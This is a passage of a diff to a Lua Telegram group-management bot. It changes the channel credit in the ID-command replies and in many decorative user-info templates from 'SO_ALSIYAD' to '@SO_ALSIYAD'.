+send(msg.chat_id_, msg.id_, '\n ⦁ الصوره ⇜ ليس لديك صور في حسابك'..'[\n¦• 𝚄𝚂𝙴𝚁 ↬ 「'..username..'」\n¦• 𝙼𝚂𝙶𝚂↬ 「'..Msguser..'」\n¦• 𝙸𝙳↬  「'..msg.sender_user_id_..'」\n¦• 𝒄𝒉↬  「@SO_ALSIYAD」\n')
 end 
 end
 end
@@ -14159,7 +14161,7 @@ get_id_text = get_id_text:gsub('#game',NUMPGAME)
 get_id_text = get_id_text:gsub('#photos',photps) 
 send(msg.chat_id_, msg.id_,'['..get_id_text..']')   
 else
-send(msg.chat_id_, msg.id_,'[\n¦• 𝚄𝚂𝙴𝚁 ↬  「'..username..'」   ↝💘\n¦• 𝙼𝚂𝙶𝚂↬ 「'..Msguser..'」   ↝💘\n¦• 𝚁𝙰𝙽𝙺↬ 「'..Rutba(msg.sender_user_id_,msg.chat_id_)..'」   ↝💘\n¦• 𝙸𝙳↬  「'..msg.sender_user_id_..'」   ↝💘\n¦• 𝒄𝒉↬ 「SO_ALSIYAD 」   ↝💘\n')
+send(msg.chat_id_, msg.id_,'[\n¦• 𝚄𝚂𝙴𝚁 ↬  「'..username..'」   ↝💘\n¦• 𝙼𝚂𝙶𝚂↬ 「'..Msguser..'」   ↝💘\n¦• 𝚁𝙰𝙽𝙺↬ 「'..Rutba(msg.sender_user_id_,msg.chat_id_)..'」   ↝💘\n¦• 𝙸𝙳↬  「'..msg.sender_user_id_..'」   ↝💘\n¦• 𝒄𝒉↬ 「@SO_ALSIYAD」   ↝💘\n')
 end
 end
 
@@ -14254,12 +14256,12 @@ else
 username = 'لا يوجد '
 end
 if result.status_.ID == "UserStatusRecently" and result.profile_photo_ ~= false then
-sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, sofi.photos_[0].sizes_[1].photo_.persistent_id_,''..rdphoto..'\n¦• 𝚄𝚂𝙴𝚁 ↬  「'..username..'」     ↝💘\n¦• 𝙼𝚂𝙶𝚂↬  「'..Msguser..'」     ↝💘\n¦• 𝚁𝙰𝙽𝙺↬ 「'..Rutba(msg.sender_user_id_,msg.chat_id_)..'」     ↝💘\n¦• 𝙸𝙳↬   「'..msg.sender_user_id_..'」    ↝💘\n¦• 𝒄𝒉↬  「SO_ALSIYAD 」     ↝💘\n')
+sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, sofi.photos_[0].sizes_[1].photo_.persistent_id_,''..rdphoto..'\n¦• 𝚄𝚂𝙴𝚁 ↬  「'..username..'」     ↝💘\n¦• 𝙼𝚂𝙶𝚂↬  「'..Msguser..'」     ↝💘\n¦• 𝚁𝙰𝙽𝙺↬ 「'..Rutba(msg.sender_user_id_,msg.chat_id_)..'」     ↝💘\n¦• 𝙸𝙳↬   「'..msg.sender_user_id_..'」    ↝💘\n¦• 𝒄𝒉↬  「@SO_ALSIYAD」     ↝💘\n')
 else 
 if result.status_.ID == "UserStatusEmpty" and result.profile_photo_ == false then
-send(msg.chat_id_, msg.id_,'[\n ¦• 𝚄𝚂𝙴𝚁 ↬  「'..username..'」    ↝💘\n¦• 𝙼𝚂𝙶𝚂↬ 「'..Msguser..'」.   ↝💘\n ¦• 𝚁𝙰𝙽𝙺↬ 「'..Rutba(msg.sender_user_id_,msg.chat_id_)..'」    ↝💘\n¦• 𝙸𝙳↬  「'..msg.sender_user_id_..'」    ↝💘\n¦• 𝒄𝒉↬   「SO_ALSIYAD 」    ↝💘\n')
+send(msg.chat_id_, msg.id_,'[\n ¦• 𝚄𝚂𝙴𝚁 ↬  「'..username..'」    ↝💘\n¦• 𝙼𝚂𝙶𝚂↬ 「'..Msguser..'」.   ↝💘\n ¦• 𝚁𝙰𝙽𝙺↬ 「'..Rutba(msg.sender_user_id_,msg.chat_id_)..'」    ↝💘\n¦• 𝙸𝙳↬  「'..msg.sender_user_id_..'」    ↝💘\n¦• 𝒄𝒉↬   「@SO_ALSIYAD」    ↝💘\n')
 else
-send(msg.chat_id_, msg.id_, '\n ⦁ الصوره ⇜ ليس لديك صور في حسابك'..'[\n¦• 𝚄𝚂𝙴𝚁 ↬ 「'..username..'」\n¦• 𝙼𝚂𝙶𝚂↬ 「'..Msguser..'」\n¦• 𝙸𝙳↬  「'..msg.sender_user_id_..'」\n¦• 𝒄𝒉↬  「SO_ALSIYAD 」\n')
+send(msg.chat_id_, msg.id_, '\n ⦁ الصوره ⇜ ليس لديك صور في حسابك'..'[\n¦• 𝚄𝚂𝙴𝚁 ↬ 「'..username..'」\n¦• 𝙼𝚂𝙶𝚂↬ 「'..Msguser..'」\n¦• 𝙸𝙳↬  「'..msg.sender_user_id_..'」\n¦• 𝒄𝒉↬  「@SO_ALSIYAD」\n')
 end 
 end
 end
@@ -14277,7 +14279,7 @@ get_id_text = get_id_text:gsub('#game',NUMPGAME)
 get_id_text = get_id_text:gsub('#photos',photps) 
 send(msg.chat_id_, msg.id_,'['..get_id_text..']')   
 else
-send(msg.chat_id_, msg.id_,'[\n¦• 𝚄𝚂𝙴𝚁 ↬  「'..username..'」   ↝💘\n¦• 𝙼𝚂𝙶𝚂↬ 「'..Msguser..'」   ↝💘\n¦• 𝚁𝙰𝙽𝙺↬ 「'..Rutba(msg.sender_user_id_,msg.chat_id_)..'」   ↝💘\n¦• 𝙸𝙳↬  「'..msg.sender_user_id_..'」   ↝💘\n¦• 𝒄𝒉↬ 「SO_ALSIYAD 」   ↝💘\n')
+send(msg.chat_id_, msg.id_,'[\n¦• 𝚄𝚂𝙴𝚁 ↬  「'..username..'」   ↝💘\n¦• 𝙼𝚂𝙶𝚂↬ 「'..Msguser..'」   ↝💘\n¦• 𝚁𝙰𝙽𝙺↬ 「'..Rutba(msg.sender_user_id_,msg.chat_id_)..'」   ↝💘\n¦• 𝙸𝙳↬  「'..msg.sender_user_id_..'」   ↝💘\n¦• 𝒄𝒉↬ 「@SO_ALSIYAD」   ↝💘\n')
 end
 end
 
@@ -14394,7 +14396,7 @@ local List = {
 𖤍 |↶ #username    ꙰🇪🇬.
 𖤍 |↶ #msgs    ꙰🇪🇬.
 𖤍 |↶ #stast    ꙰🇪🇬.
-𖤍 |↶ 𝗖𝗛 - 「SO_ALSIYAD 」 ⦁.
+𖤍 |↶ 𝗖𝗛 - 「@SO_ALSIYAD」 ⦁.
 ]],
 [[
 ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
@@ -14403,7 +14405,7 @@ local List = {
  𝗦𝗧𝗔 ⟿ #stast  « 
  𝗜𝗗  ⟿ #id  « 
 ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
-𝗖𝗛 - 「SO_ALSIYAD 」 ⦁.
+𝗖𝗛 - 「@SO_ALSIYAD」 ⦁.
 ]],
 [[
 🇪🇬≪💎≫ #username • メ
@@ -14411,21 +14413,21 @@ local List = {
 🇪🇬≪💎≫ #id  • メ
 🇪🇬≪💎≫ #msgs  •メ
 🇪🇬≪💎≫ #game •メ
-🇪🇬𝗖𝗛 - 「SO_ALSIYAD 」 💞.
+🇪🇬𝗖𝗛 - 「@SO_ALSIYAD」 💞.
 ]],
 [[
  𝚄𝚂𝙴𝚁 𓄹𓄼 #username
  𝙸𝙳  ??𓄼 #id 
  𝚂𝚃𝙰 𓄹𓄼 #stast 
  𝙼𝚂𝙶𝚂𓄹𓄼 #msgs
- 𝗖𝗛 - 「SO_ALSIYAD 」 ??.
+ 𝗖𝗛 - 「@SO_ALSIYAD」 ??.
 ]],
 [[
 𓅓➪:ᗰᔕᘜᔕ : #msgs - ❦ .
 ??➪ : Iᗪ : #id - ❦ . 
 𓅓➪ : ᔕTᗩᔕT : #stast - ❦ . 
 𓅓➪ : ᑌᔕᖇᗴᑎᗩᗰᗴ : #username _ ❦ .
-𓅓➪ : 𝗖𝗛 - 「SO_ALSIYAD 」 💞.
+𓅓➪ : 𝗖𝗛 - 「@SO_ALSIYAD」 💞.
 ]],
 [[
 - ايديڪ  ⁞ #id 💘 ٬
@@ -14433,14 +14435,14 @@ local List = {
 - رسائلڪ  الطيفهہَ ⁞ #msgs 💘 ٬
 - رتبتڪ الحلوه ⁞ #stast  💘٬
 - سحڪاتڪ الفول ⁞ #edit 💘 ٬
-- 𝗖𝗛 - 「SO_ALSIYAD 」 💞.
+- 𝗖𝗛 - 「@SO_ALSIYAD」 💞.
 ]],
 [[
 𓁷⁦⁦ - 𝙪𝙚𝙨 †: #username 𓀀 .
 𓁷 - 𝙢𝙨𝙜 † : #msgs 𓀀 .
 𓁷 - 𝙨𝙩𝙖 †: #stast 𓀀  .
 𓁷 - 𝙞?? †: #id 𓀀 .
-𓁷 - 𝗖𝗛 - 「SO_ALSIYAD 」 💞.
+𓁷 - 𝗖𝗛 - 「@SO_ALSIYAD」 💞.
 ]],
 [[
 𖡋 𝐔𝐒𝐄 #username 
@@ -14448,7 +14450,7 @@ local List = {
 𖡋 𝐒𝐓𝐀 #stast 
 𖡋 𝐈𝐃 #id 
 𖡋 𝐄𝐃𝐈𝐓 #edit
-𖡋 𝗖𝗛 - 「SO_ALSIYAD 」 ⦁.
+𖡋 𝗖𝗛 - 「@SO_ALSIYAD」 ⦁.
 ]],
 [[
 𖤂 ~ 𝑢𝑠𝑒 #username  𖤐
@@ -14456,23 +14458,23 @@ local List = {
 𖤂 ~ 𝑠𝑡𝑎 #stast  
 𖤂 ~ 𝑖𝑑 #id 𖤐
 𖤂 ~ 𝑒𝑑𝑖𝑡 #edit 𖤐
-𖤂 ~ 𝗖𝗛 - 「SO_ALSIYAD 」 ⦁.
+𖤂 ~ 𝗖𝗛 - 「@SO_ALSIYAD」 ⦁.
 ]],
 [[
 ••• ••• ••• ••• ••• ••• ••• 
 ࿕ ¦• 𝙐𝙎𝙀𝙍  ⟿ #username ༆
  ࿕ ¦• 𝙈𝙎𝙂𝙎   ⟿ #msgs ༆
- ࿕ ¦• 𝙂𝙈𝘼𝙎  ⟿ #stast ༆
+ ࿕ ¦• ??𝙈𝘼𝙎  ⟿ #stast ༆
  ࿕ ¦• 𝙏𝘿 𝙎𝙏𝘼  ⟿ #id ༆
 ••• ••• ••• ••• ••• ••• •••
- ࿕ ¦• 𝗖𝗛 - 「SO_ALSIYAD 」 ⦁.
+ ࿕ ¦• 𝗖𝗛 - 「@SO_ALSIYAD」 ⦁.
 ]],
 [[
 ► 𝗨𝗦𝗘𝗥𝗡𝗔𝗠𝗘 #username 𓃚  ꙰
 ► 𝗜𝗗 #id 𓃚 ꙰
 ► 𝗦𝗧𝗔𝗦 #stast 𓃚 ꙰
 ► 𝗠𝗦𝗔𝗚 #msgs 𓃚 ꙰
-► 𝗖𝗛 - 「SO_ALSIYAD 」 ⦁.
+► 𝗖𝗛 - 「@SO_ALSIYAD」 ⦁.
 ]],
 [[
 -›   𝚄𝚂𝙴𝚁𝙽𝙰𝙼𝙴 . #username 🇪🇬 ꙰ 
@@ -14480,14 +14482,14 @@ local List = {
 -›   𝙸𝙳 . #id 🇪🇬 ꙰ 
 -›   𝙶𝙼𝙰𝚂 . #stast 🇪🇬 ꙰ 
 -›   𝙼𝚂𝙶𝚂 . #msgs 🇪🇬 ꙰
--›   ??𝗛 - 「SO_ALSIYAD 」 🇪🇬 ꙰.
+-›   ??𝗛 - 「@SO_ALSIYAD」 🇪🇬 ꙰.
 ]],
 [[
 - UsEr🇪🇬 ꙰ #username
 - StA🇪🇬 ꙰   #msgs
 - MsGs🇪🇬 ꙰ #stast
 - ID🇪🇬 ꙰  #id
-- 𝗖𝗛 🇪🇬 ꙰  「SO_ALSIYAD 」 💞.
+- 𝗖𝗛 🇪🇬 ꙰  「@SO_ALSIYAD」 💞.
 ]],
 [[
 ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
@@ -14496,14 +14498,14 @@ local List = {
 🇪🇬 - 𝙶𝙼𝙰𝚂 ⟿ #stast 💘.
 🇪🇬 - 𝙸𝙳 𝚂𝚃𝙰 ⟿ #id 💘.  
 ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
-🇪🇬 - 𝗖𝗛 - 「SO_ALSIYAD 」 ⦁.
+🇪🇬 - 𝗖𝗛 - 「@SO_ALSIYAD」 ⦁.
 ]],
 [[
 - 𓏬 𝐔𝐬𝐄𝐫 : #username 𓂅 .
 - 𓏬 𝐌𝐬𝐆  : #msgs 𓂅 .
 - 𓏬 𝐒𝐭𝐀 : #stast 𓂅 .
 - 𓏬 𝐈𝐃 : #id 𓂅 .
-- 𓏬 𝗖𝗛 - 「SO_ALSIYAD 」 ⦁.
+- 𓏬 𝗖𝗛 - 「@SO_ALSIYAD」 ⦁.
 ]],
 [[
 ᯓ 𝟔𝟔𝟔 𖡋 #username •✟
@@ -14511,28 +14513,28 @@ local List = {
 ᯓ 𝟔𝟔𝟔𖡋 #id  • ✟
 ᯓ 𝟔𝟔𝟔𖡋 #msgs  •✟ 
 ᯓ 𝟔𝟔𝟔𖡋 #game •✟
-ᯓ 𝟔𝟔𝟔𖡋 𝗖𝗛 - 「SO_ALSIYAD 」 ⦁.
+ᯓ 𝟔𝟔𝟔𖡋 𝗖𝗛 - 「@SO_ALSIYAD」 ⦁.
 ]],
 [[
  ⦁•𝐮𝐬𝐞𝐫 : #username 𖣬  
  ⦁•𝐦𝐬𝐠  : #msgs 𖣬 
  ⦁•𝐬𝐭𝐚 : #stast 𖣬 
  ⦁•𝐢𝐝  : #id 𖣬
- ⦁•𝗖𝗛 - 「SO_ALSIYAD 」 ⦁.
+ ⦁•𝗖𝗛 - 「@SO_ALSIYAD」 ⦁.
 ]],
 [[
 - ᴜѕᴇʀɴᴀᴍᴇ ➣ #username .
 - ᴍѕɢѕ ➣ #msgs .
 - ѕᴛᴀᴛѕ ➣ #stast .
 - ʏᴏᴜʀ ɪᴅ ➣ #id  .
-- 𝗖𝗛 - 「SO_ALSIYAD 」 ⦁.
+- 𝗖𝗛 - 「@SO_ALSIYAD」 ⦁.
 ]],
 [[
 - ᴜѕʀ: #username ঌ.
 - ᴍѕɢ: #msgs  ঌ.
 - ѕᴛᴀ: #stast  ঌ.
 - ɪᴅ: #id ঌ.
-- 𝗖𝗛 - 「SO_ALSIYAD 」 ⦁.
+- 𝗖𝗛 - 「@SO_ALSIYAD」 ⦁.
 ]],
 [[
 - 𝑢𝑠𝑒𝑟𝑛𝑎𝑚𝑒 ⟿ #username
@@ -14540,14 +14542,14 @@ local List = {
 - 𝑖𝑑 ⟿ #id
 - 𝑒𝑑𝑖𝑡 ⟿ #edit
 - 𝑔𝑎𝑚𝑒 ⟿ #game
-- 𝗖𝗛 - 「SO_ALSIYAD 」 ⦁.
+- 𝗖𝗛 - 「@SO_ALSIYAD」 ⦁.
 ]],
 [[
 ⌔➺: Msgs : #msgs - 🔹.
 ⌔➺: ID : #id - 🔹.
 ⌔➺: Stast : #stast -🔹.
 ⌔➺: UserName : #username -🔹.
-⌔➺: 𝗖𝗛 - 「SO_ALSIYAD 」 ⦁.
+⌔➺: 𝗖𝗛 - 「@SO_ALSIYAD」 ⦁.
 ]],
 [[
 ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
@@ -14556,28 +14558,28 @@ local List = {
 🇪🇬 ꙰  - 𝚐 𝚖 𝚊𝚜  ➟ #stast ❃.
 🇪🇬 ꙰  - 𝙸𝙳 𝚜𝚝𝚊   ➟ #id ❃.
 ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
-🇪🇬 ꙰  - 𝗖𝗛 - 「SO_ALSIYAD 」 ⦁.
+🇪🇬 ꙰  - 𝗖𝗛 - 「@SO_ALSIYAD」 ⦁.
 ]],
 [[
 🌯 ¦✙• 𝐮𝐬𝐞𝐫𝒏𝒂𝒎𝒆 ➢ ⁞  #username 🇪🇬
 🌯 ¦✙• 𝐦𝐬𝐠 ➢ ⁞  #msgs  📝
 🌯 ¦✙• 𝒓𝒂𝒏𝒌 ➢ ⁞ #stast  
 🌯 ¦✙• 𝐢𝐝 𝒔𝒕𝒂 ➢ ⁞ #id  🆔
-🌯 ¦ 𝗖𝗛 - 「SO_ALSIYAD 」 ⦁.
+🌯 ¦ 𝗖𝗛 - 「@SO_ALSIYAD」 ⦁.
 ]],
 [[
 ¦• 𝚄𝚂𝙴𝚁  ⇉⁞ #username ↝🇪??.
 ¦• 𝙼𝚂𝙶𝚂 ⇉ ⁞  #msgs  ↝ 🇪🇬.
 ¦• 𝚁𝙰𝙽𝙺  ⇉⁞ #stast  ↝🇪🇬.
 ¦• 𝙸𝙳 𝚂𝚃𝙰 ⇉ #id  ↝🇪🇬.
-¦• 𝗖𝗛 - 「SO_ALSIYAD 」 ⦁.
+¦• 𝗖𝗛 - 「@SO_ALSIYAD」 ⦁.
 ]],
 [[
 ➞: 𝒔𝒕𝒂𓂅 #stast 𓍯➸💞.
 ➞: 𝒖??𝒆𝒓𓂅 #username 𓍯➸💞.
 ➞: 𝒎𝒔𝒈𝒆𓂅 #msgs 𓍯➸💞.
 ➞: 𝐢𝐝 𓂅 #id 𓍯➸💞.
-➞: 𝗖𝗛 - 「SO_ALSIYAD 」 💞.
+➞: 𝗖𝗛 - 「@SO_ALSIYAD」 💞.
 ]],
 [[
 ➼ : 𝐼𝐷 𖠀 #id . ♡
@@ -14585,14 +14587,14 @@ local List = {
 ➼ : 𝑀𝑆𝐺𝑆 𖠀 #msgs .♡
 ➼ : 𝑆𝑇𝐴S𝑇 𖠀 #stast .♡ 
 ➼ : 𝐸𝐷𝐼𝑇  𖠀 #edit .♡
-➼ : 𝗖𝗛 - 「SO_ALSIYAD 」 ⦁.
+➼ : 𝗖𝗛 - 「@SO_ALSIYAD」 ⦁.
 ]],
 [[
 ▽ ¦❀• USER ➭ ⁞ #username .
 ▽ ¦❀• 𝙼𝚂𝙶𝚂 ➬ ⁞  #msgs  .
 ▽ ¦❀• STAT ➬ ⁞ #stast  .
 ▽ ¦❀• 𝙸𝙳  ➬ ⁞ #id  .
-▽ ¦❀• 𝗖𝗛 - 「SO_ALSIYAD 」 ⦁.
+▽ ¦❀• 𝗖𝗛 - 「@SO_ALSIYAD」 ⦁.
 ]],
 [[
 • ❉ 𝑼𝑬𝑺 : #username ‌‌‏.
@@ -14600,14 +14602,14 @@ local List = {
 • ❉ 𝑰𝑫 : #id  ‌‌‏.
 • ❉  𝑴𝑺𝑮 : #msgs 𓆊.
 • ❉ 𝑾𝒆𝒍𝒄𝒐𝒎𝒆  ⁞ .
-• ❉ 𝗖𝗛 - 「SO_ALSIYAD 」 ⦁.
+• ❉ 𝗖𝗛 - 「@SO_ALSIYAD」 ⦁.
 ]],
 [[
 |USERNAME #username 𓃚
 | YOUR -ID - #id 𓃚
 | STAS-#stast 𓃚
  | MSAG - #msgs 𓃚
- | 𝗖𝗛 - 「SO_ALSIYAD 」 ⦁.
+ | 𝗖𝗛 - 「@SO_ALSIYAD」 ⦁.
 ]],
 [[
 𝟔𝟔𝟔 𖡋 #username • 𖣰💞
@@ -14615,14 +14617,14 @@ local List = {
 𝟔𝟔𝟔 𖡋 #id • 𖣰💞
 𝟔𝟔𝟔 𖡋 #game • 𖣰💞
 𝟔𝟔𝟔 𖡋 #msgs • 𖣰💞
-𝟔𝟔𝟔 𖡋 𝗖𝗛 - 「SO_ALSIYAD 」 ⦁.
+𝟔𝟔𝟔 𖡋 𝗖𝗛 - 「@SO_ALSIYAD」 ⦁.
 ]],
 [[
 ⌔➺: Msgs : #msgs - 🔹.
 ⌔➺: ID : #id - 🔹.
 ⌔➺: Stast : #stast -🔹.
 ⌔➺: UserName : #username -🔹.
-⌔➺: 𝗖𝗛 - 「SO_ALSIYAD 」 ⦁.
+⌔➺: 𝗖𝗛 - 「@SO_ALSIYAD」 ⦁.
 ]],
 [[
  ⦁ - 𝓾𝓼𝓮𝓻 ➪ #username ⦁.
@@ -14630,42 +14632,42 @@ local List = {
  ⦁ - 𝓲𝓭 ➪ #id ⸙ ⦁.
  ⦁ - 𝓰𝓶𝓪𝓼 ➪ #gmas ⸙ ⦁.
  ⦁ - 𝓶𝓼𝓰𝓼 ➪ #msgs ⦁.
- ⦁ - 𝗖𝗛 - 「SO_ALSIYAD 」 ⦁.
+ ⦁ - 𝗖𝗛 - 「@SO_ALSIYAD」 ⦁.
 ]],
 [[
 - 𝄬 username . #username ➪🇪🇬
  - 𝄬 stast . #stast ➪🇪🇬
  - 𝄬 id . #id ➪🇪🇬
  - 𝄬 msgs . #msgs ➪🇪🇬
- - 𝄬 𝗖𝗛 - 「SO_ALSIYAD 」 ⦁.
+ - 𝄬 𝗖𝗛 - 「@SO_ALSIYAD」 ⦁.
 ]],
 [[
 ◣: 𝒔𝒕𝒂𓂅 #stast 𓍯➥♡.
 ◣: 𝐮𝐬𝐞𝐫𓂅 #username 𓍯➥♡.
 ◣: 𝒎𝒔𝒈𝒆𓂅 #msgs 𓍯➥♡.
 ◣: 𝐢𝐝 𓂅 #id 𓍯➥♡.
-◣: 𝗖𝗛 - 「SO_ALSIYAD 」 ⦁.
+◣: 𝗖𝗛 - 「@SO_ALSIYAD」 ⦁.
 ]],
 [[
 ↣• USE ➤ #username  ↝🍬.
 ↣• MSG ➤  #msgs  ↝🍬.
 ↣• STA ➤  #stast  ↝🍬.
 ↣• iD ➤ #id  ↝🍬.
-↣• 𝗖𝗛 - 「SO_ALSIYAD 」 ⦁.
+↣• 𝗖𝗛 - 「@SO_ALSIYAD」 ⦁.
 ]],
 [[
 ➫✿: S #stast 𓍯➟♡.
 ➫✿: U𓂅 #username 𓍯➟♡.
 ➫✿: M𓂅 #msgs 𓍯➟♡.
 ➫✿:  I  #id ➟♡.
-➫✿: 𝗖𝗛 - 「SO_ALSIYAD 」 ⦁.
+➫✿: 𝗖𝗛 - 「@SO_ALSIYAD」 ⦁.
 ]],
 [[
 ✶- 𝒔𝒕𝒂𓂅 #stast 𓍯↝❃ .
 ✶- 𝐮𝐬𝐞𝐫𓂅 #username 𓍯↝❃.
 ✶- 𝒎𝒔𝒈𝒆𓂅 #msgs 𓍯↝❃.
 ✶- 𝐢𝐝 𓂅 #id 𓍯↝❃.
-✶- 𝗖𝗛 - 「SO_ALSIYAD 」 ⦁.
+✶- 𝗖𝗛 - 「@SO_ALSIYAD」 ⦁.
 ]],
 [[
 • 🖤 | 𝑼𝑬𝑺 :  #username
@@ -14676,14 +14678,14 @@ local List = {
 
 • 🖤 | 𝑴𝑺𝑮 : #msgs
 
-• 🖤 | 𝗖𝗛 - 「SO_ALSIYAD 」 ⦁.
+• 🖤 | 𝗖𝗛 - 「@SO_ALSIYAD」 ⦁.
 ]],
 [[
 • USE 𖦹 #username 
 • MSG 𖥳 #msgs  
 • STA 𖦹 #stast 
 • iD 𖥳 #id
-• 𝗖𝗛 - 「SO_ALSIYAD 」 💞.
+• 𝗖𝗛 - 「@SO_ALSIYAD」 💞.
 ]],
 [[
 - ᴜѕᴇʀɴᴀᴍᴇ ➣ #username .
@@ -14693,7 +14695,7 @@ local List = {
 - ᴇᴅɪᴛ ᴍsɢ ➣ #edit .
 - ᴅᴇᴛᴀɪʟs ➣ #auto . 
 -  ɢᴀᴍᴇ ➣ #game .
-- 𝗖𝗛 - 「SO_ALSIYAD 」 💞.
+- 𝗖𝗛 - 「@SO_ALSIYAD」 💞.
 ]],
 [[
 ⚕𝙐𝙎𝙀𝙍𝙉𝘼𝙈𝙀 : #username
@@ -14702,7 +14704,7 @@ local List = {
 ⚕𝙄𝘿 : #id
 ⚕𝙅𝙀𝙒𝙀𝙇𝙎 : #game
 ⚕𝘿𝙀𝙑 : #ridha
-⚕𝗖𝗛 - 「SO_ALSIYAD 」 💞.
+⚕𝗖𝗛 - 「@SO_ALSIYAD」 💞.
 ]],
 [[
 • 🦄 | 𝑼𝑬𝑺 : #username ‌‌‏⚚
@@ -14710,7 +14712,7 @@ local List = {
 • 🦄 | 𝑰𝑫 : #id ‌‌‏♕
 • 🦄 | 𝑴𝑺𝑮 : #msgs 𓆊
 • 🦄 | 𝑾𝒆𝒍𝒄𝒐𝒎𝒆 : ⁞
-• 🦄 | 𝗖𝗛 - 「SO_ALSIYAD 」 💞.
+• 🦄 | 𝗖𝗛 - 「@SO_ALSIYAD」 💞.
 ]],
 [[
 • △ | 𝑼𝑬𝑺 : #username ‌‌‏⚚
@@ -14718,7 +14720,7 @@ local List = {
 • ⊠ | 𝑰𝑫 : #id ‌‌‏♕
 • ❏ | 𝑴𝑺𝑮 : #msgs 𓆊
 • ❏ | 𝑾𝒆𝒍𝒄𝒐𝒎𝒆 :
-• ❏ | 𝗖𝗛 - 「SO_ALSIYAD 」 💞.
+• ❏ | 𝗖𝗛 - 「@SO_ALSIYAD」 💞.
 ]],
 [[
 ┇iD ➺ #id 💘
@@ -14726,7 +14728,7 @@ local List = {
 ┇MsG ➺ #msgs 🧸 
 ┇StAtE ➺ #stast 🎀
 ┇EdIT ➺ #edit  💒
-┇𝗖𝗛 - 「SO_ALSIYAD 」 ⦁.
+┇𝗖𝗛 - 「@SO_ALSIYAD」 ⦁.
 ]],
 [[
 ⚕ 𓆰 𝑾𝒆𝒍𝒄𝒐𝒎𝒆 𝑻𝒐 ★
@@ -14734,7 +14736,7 @@ local List = {
 • 🖤 | 𝑺𝑻𝑨 : #stast 🧙🏻‍♂ ☥
 • 🖤 | 𝑰𝑫 : #id ‌‌‏♕
 • 🖤 | 𝑴𝑺𝑮 : #msgs 𓆊
-• 🖤 | 𝗖𝗛 - 「SO_ALSIYAD 」 ⦁.
+• 🖤 | 𝗖𝗛 - 「@SO_ALSIYAD」 ⦁.
 ]],
 [[
 ┄─━━ ⦁━━─┄
@@ -14745,14 +14747,14 @@ local List = {
 𖥣 ᴇᴅɪᴛ 𓄹𓄼 #game🙇🏿‍♀💕
 ✰ ᴄʜ ᴇʟɪɴ ➣ #edit
 ┄─━━ ⦁━━─┄
-✰ 𝗖𝗛 - 「SO_ALSIYAD 」 ⦁.
+✰ 𝗖𝗛 - 「@SO_ALSIYAD」 ⦁.
 ]],
 [[
 𓄼 ᴜѕᴇ : #username ♕
 𓄼 ѕᴛᴀ : #stast ☥
 𓄼 ɪᴅ : #id ‌‌‏⚚
 𓄼 ᴍѕɢ : #msgs 𓆊
-𓄼 𝗖𝗛 - 「SO_ALSIYAD 」 💞.
+𓄼 𝗖𝗛 - 「@SO_ALSIYAD」 💞.
 ]],
 [[
 • ﮼ايديك  #id 🌻 ٬
@@ -14760,7 +14762,7 @@ local List = {
 • ﮼مسجاتك ➺ #msgs 🌻 ٬
 •  ﮼رتبتك➺ #stast 🌻 ٬
 • ﮼تعديلك ➺ #edit 🌻 ٬
-• ﮼ تعين ➺ 「SO_ALSIYAD 」 💞.
+• ﮼ تعين ➺ 「@SO_ALSIYAD」 💞.
 ]],
 [[
 ‎⿻┊Yor iD 𖠄 #id ٫
@@ -14768,7 +14770,7 @@ local List = {
 ‌‎⿻┊MsGs 𖠄 #msgs ٫
 ‌‎⿻┊StAtS 𖠄 #stast ٫
 ‌‎⿻┊‌‎EdiT 𖠄 #edit ٫
-‌‎⿻┊‌‎𝗖𝗛 - 「SO_ALSIYAD 」 💞.
+‌‎⿻┊‌‎𝗖𝗛 - 「@SO_ALSIYAD」 💞.
 ]],
 [[
 ⌾ | 𝐢𝐝  𓃠 #id .
@@ -14776,7 +14778,7 @@ local List = {
 ⌾ | 𝐦𝐬𝐠 𓃠 #msgs .
 ⌾ | 𝐬??𝐚 𓃠 #stast .
 ⌾ | 𝒆𝒅𝒊𝒕 𓃠 #edit .
-⌾ | 𝗖𝗛 - 「SO_ALSIYAD 」 💞.
+⌾ | 𝗖𝗛 - 「@SO_ALSIYAD」 💞.
 ]],
 [[
 ♡ : 𝐼𝐷 𖠀 #id .
@@ -14784,49 +14786,49 @@ local List = {
 ♡ : 𝑀𝑆𝐺𝑆 𖠀 #msgs .
 ♡ : 𝑆𝑇𝐴𝑇𝑆 𖠀 #stast .
 ♡ : 𝐸𝐷𝐼𝑇  𖠀 #edit .
-♡ : 𝗖𝗛 - 「SO_ALSIYAD 」 💞.
+♡ : 𝗖𝗛 - 「@SO_ALSIYAD」 💞.
 ]],
 [[
 •ᑌᔕᗴᖇ- #username 
 •ᔕTᗩ- #stast 
 •ᗰᔕ- #msgs 
 •Iᗪ- #id
-•𝗖𝗛 - 「SO_ALSIYAD 」 💞.
+•𝗖𝗛 - 「@SO_ALSIYAD」 💞.
 ]],
 [[
 • USE ➤ #username  .
 • MSG ➤  #msgs  .
 • STA ➤  #stast  .
 • iD ➤ #id  .
-• 𝗖𝗛 - 「SO_ALSIYAD 」 💞.
+• 𝗖𝗛 - 「@SO_ALSIYAD」 💞.
 ]],
 [[
 𝐘𝐨𝐮𝐫 𝐈𝐃 ☤🇪🇬- #id 
 𝐔𝐬𝐞𝐫𝐍𝐚☤🇪🇬- #username 
 𝐒𝐭𝐚𝐬𝐓 ☤🇪🇬- #stast 
 𝐌𝐬𝐠𝐒☤🇪🇬 - #msgs
-𝗖𝗛☤🇪🇬 - 「SO_ALSIYAD 」 ⦁.
+𝗖𝗛☤🇪🇬 - 「@SO_ALSIYAD」 ⦁.
 ]],
 [[
 ⭐️𝖘𝖙𝖆 : #stast ـ🍭
 ⭐️𝖚𝖘𝖊𝖗𝖓𝖆𝖒𝖊 : #username ـ🍭
 ⭐️𝖒𝖘𝖌𝖘 : #msgs ـ🍭
 ⭐️𝖎𝖉 : #id ـ 🍭
-⭐️𝗖𝗛 - 「SO_ALSIYAD 」 💞.
+⭐️𝗖𝗛 - 「@SO_ALSIYAD」 💞.
 ]],
 [[
 • 🇪🇬 - 𝚄𝚂𝙴𝚁 « #username  🍭
 • 🇪🇬 - 𝙸𝙳 « #id  🍭
